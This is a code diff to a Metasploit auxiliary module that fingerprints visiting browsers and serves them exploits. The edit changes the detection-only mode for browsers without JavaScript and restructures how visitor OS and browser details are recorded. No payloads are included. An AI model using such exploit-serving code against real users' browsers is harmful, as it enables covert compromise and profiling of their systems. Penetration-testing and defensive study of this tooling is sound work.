@@ -218,7 +218,9 @@ class Metasploit3 < Msf::Auxiliary
 		@init_html << "</script> </head> "
 		@init_html << "<body onload=\"#{@init_js.sym("bodyOnLoad")}()\"> "
 		@init_html << "<noscript> \n"
-		@init_html << build_iframe("#{self.get_resource}?ns=1")
+		# Don't use build_iframe here because it will break detection in
+		# DefangedDetection mode when the target has js disabled.
+		@init_html << "<iframe src=\"#{self.get_resource}?ns=1\"></iframe>"
 		@init_html << "</noscript> \n"
 		@init_html << "</body> </html> "
 
@@ -445,10 +447,7 @@ class Metasploit3 < Msf::Auxiliary
 			# in the "sessid" parameter as a base64 encoded string.
 			record_detection(cli, request)
 			if (action.name == "DefangedDetection")
-				#print_status("")
 				response = create_response()
-				response["Expires"] = "0"
-				response["Cache-Control"] = "must-revalidate"
 				response.body = "Please wait"
 			else
 				print_status("Responding with exploits")
@@ -464,8 +463,16 @@ class Metasploit3 < Msf::Auxiliary
 			# most of our exploits require javascript anyway.
 			print_status("Browser has javascript disabled, trying exploits that don't need it")
 			record_detection(cli, request)
-			response = build_noscript_response(cli, request)
+			if (action.name == "DefangedDetection")
+				response = create_response()
+				response.body = "Please wait"
+			else
+				print_status("Responding with non-javascript exploits")
+				response = build_noscript_response(cli, request)
+			end
 			
+			response["Expires"] = "0"
+			response["Cache-Control"] = "must-revalidate"
 			cli.send_response(response)
 		else
 			print_status("404ing #{request.uri}")
@@ -701,7 +708,7 @@ class Metasploit3 < Msf::Auxiliary
 			# navigator.userAgent
 			print_status("Recording detection from User-Agent: #{request['User-Agent']}")
 			report_user_agent(cli.peerhost, request)
-		elsif framework.db.active
+		else
 			data_offset += 'sessid='.length
 			detected_version = request.uri[data_offset, request.uri.length]
 			if (0 < detected_version.length)
@@ -709,28 +716,23 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("JavaScript Report: #{detected_version}")
 				(os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')
 
-				host_info = { :host => cli.peerhost }
-				host_info[:os_name]   = os_name   if os_name != "undefined"
-				host_info[:os_flavor] = os_flavor if os_flavor != "undefined"
-				host_info[:os_sp]     = os_sp     if os_sp != "undefined"
-				host_info[:os_lang]   = os_lang   if os_lang != "undefined"
-				host_info[:arch]      = arch      if arch != "undefined"
+				if framework.db.active
+					host_info = { :host => cli.peerhost }
+					host_info[:os_name]   = os_name   if os_name != "undefined"
+					host_info[:os_flavor] = os_flavor if os_flavor != "undefined"
+					host_info[:os_sp]     = os_sp     if os_sp != "undefined"
+					host_info[:os_lang]   = os_lang   if os_lang != "undefined"
+					host_info[:arch]      = arch      if arch != "undefined"
 
-				report_host(host_info)
-
-				client_info = ({
-					:host      => cli.peerhost,
-					:ua_string => request['User-Agent'],
-					:ua_name   => ua_name,
-					:ua_ver    => ua_ver
-				})
-				report_client(client_info)
-
-				report_note({
-					:host => cli.peerhost,
-					:type => 'http_request',
-					:data => "#{cli.peerhost}: #{request.method} #{request.resource} #{os_name} #{ua_name} #{ua_ver}"
-				})
+					report_host(host_info)
+					client_info = ({
+						:host      => cli.peerhost,
+						:ua_string => request['User-Agent'],
+						:ua_name   => ua_name,
+						:ua_ver    => ua_ver
+					})
+					report_client(client_info)
+				end
 			end
 		end
 
